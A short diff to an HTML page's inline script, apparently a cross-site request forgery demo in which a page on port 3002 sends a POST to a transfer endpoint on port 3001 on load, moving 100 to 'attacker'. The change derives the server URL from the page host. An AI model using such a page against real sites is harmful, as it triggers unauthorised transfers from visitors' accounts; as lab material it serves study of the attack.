@@ -8,7 +8,10 @@
 </head>
 <body>
 <script>
-  fetch('http://localhost:3001/transfer', {
+  const serverUrl = document.location.host.replace("3002", "3001");
+  console.log("serverUrl:", serverUrl);
+
+  fetch(`https://${serverUrl}/transfer`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ amount: 100, to: 'attacker' }),
